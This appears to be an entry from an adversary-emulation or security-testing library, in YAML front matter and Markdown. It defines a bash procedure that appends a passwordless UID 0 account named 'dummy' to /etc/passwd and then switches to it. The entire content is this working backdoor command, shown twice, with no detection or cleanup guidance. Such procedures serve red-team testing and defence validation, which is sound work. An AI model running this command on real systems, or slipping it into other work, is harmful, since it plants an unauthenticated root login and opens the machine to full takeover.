---
id: cf775959-2850-477b-9d4a-94f2531274fd
name: Add Dummy User to /etc/passwd and Switch to Dummy User
type: command
executor: bash
data: 'echo ''dummy::0:0::/root:/bin/bash'' >>/etc/passwd

  su - dummy'
output: null
created_at: '2023-04-06T03:56:19.219828+00:00'
updated_at: '2023-04-10T20:34:31.996193+00:00'
---

# Add Dummy User to /etc/passwd and Switch to Dummy User

```bash
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```


